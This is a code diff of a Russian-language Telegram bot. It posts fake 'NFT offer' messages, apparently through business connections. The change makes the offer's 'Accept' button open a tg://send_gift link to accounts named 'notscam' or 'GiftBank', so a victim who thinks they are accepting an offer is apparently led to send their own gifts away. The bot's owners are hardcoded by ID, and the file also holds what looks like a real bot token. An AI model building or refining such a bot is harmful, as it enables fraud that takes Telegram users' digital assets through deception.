@@ -6,17 +6,12 @@ import threading
 import time
 import telebot
 from telebot import types
-from telebot.apihelper import ApiTelegramException
 
 TOKEN = "9217093222:AAGYb3Lu8L5ppSuHYehYYi4xvdFhMtGK5E0"
 OWNERS = {6226038990}
 
 DEFAULT_RATE_URL = "tg://send_gift?to=notscam"
 DEFAULT_SPEC_URL = "tg://send_gift?to=GiftBank"
-
-EMOJI_YES, EMOJI_NO = "5776375003280838798", "577637501825945508"
-COIN = {"rate": "5954135079662916434", "unrate": "5954203112117366914"}
-SOLD_EMOJI = "5773677501825945508"
 
 labels = {
     "u": ("Принять", "Отклонить", "Передать NFT"),
@@ -62,45 +57,67 @@ def delete_msg(chat_id, message_id, bc=None):
                 bot.delete_message(chat_id, message_id)
             except: 
                 pass
-    except:
-        pass
+    except Exception as e:
+        print(f"Delete error: {e}")
 
 @bot.message_handler(commands=["start"])
 def start(message):
     bot.reply_to(message, "Бот активен")
 
 def process_ho(message, bc_id=None):
-    if message.from_user.id not in OWNERS:
+    if message.from_user and message.from_user.id not in OWNERS:
         return
     
     text = message.text or message.caption or ""
-    parts = text.split(maxsplit=4)
+    parts = text.split()
     if len(parts) < 2:
         return
     
     link = parts[1]
     amount = parts[2] if len(parts) > 2 else "15"
     
+    # Определяем rate / unrate (по умолчанию rate)
+    mode = "rate"
+    if len(parts) > 3:
+        if "unrate" in parts[3].lower():
+            mode = "unrate"
+            
+    # Определяем язык (например, ru/u, n, i и т.д.)
+    lang_key = "u"
+    if len(parts) > 4:
+        l_arg = parts[4].lower()
+        if l_arg in labels:
+            lang_key = l_arg
+        elif l_arg == "ru":
+            lang_key = "u"
+        elif l_arg == "en":
+            lang_key = "n"
+            
+    btn_texts = labels.get(lang_key, labels["u"])
+    target_url = DEFAULT_SPEC_URL if mode == "unrate" else DEFAULT_RATE_URL
+    
     markup = types.InlineKeyboardMarkup()
+    # Делаем кнопку с ссылкой (или callback по желанию)
     markup.add(
-        types.InlineKeyboardButton("Принять", callback_data="u:accept"),
-        types.InlineKeyboardButton("Отклонить", callback_data="u:reject")
+        types.InlineKeyboardButton(btn_texts[0], url=target_url),
+        types.InlineKeyboardButton(btn_texts[1], callback_data=f"u:reject:{mode}")
     )
     
     delete_msg(message.chat.id, message.message_id, bc_id)
     
     try:
+        msg_text = f"Оффер на NFT:\nСсылка: {link}\nСумма: {amount}\nРежим: {mode}"
         if bc_id:
             bot.send_message(
                 message.chat.id,
-                f"Оффер на NFT:\nСсылка: {link}\nСумма: {amount}",
+                msg_text,
                 business_connection_id=bc_id,
                 reply_markup=markup
             )
         else:
             bot.send_message(
                 message.chat.id,
-                f"Оффер на NFT:\nСсылка: {link}\nСумма: {amount}",
+                msg_text,
                 reply_markup=markup
             )
     except Exception as e:
@@ -141,7 +158,12 @@ if __name__ == "__main__":
     print("Бот запущен локально")
     while True:
         try:
-            bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
+            bot.infinity_polling(
+                skip_pending=True, 
+                timeout=60, 
+                long_polling_timeout=60,
+                allowed_updates=["message", "edited_message", "callback_query", "business_message", "business_connection", "edited_business_message"]
+            )
         except Exception as e:
             print(f"Polling error: {e}")
             time.sleep(5)
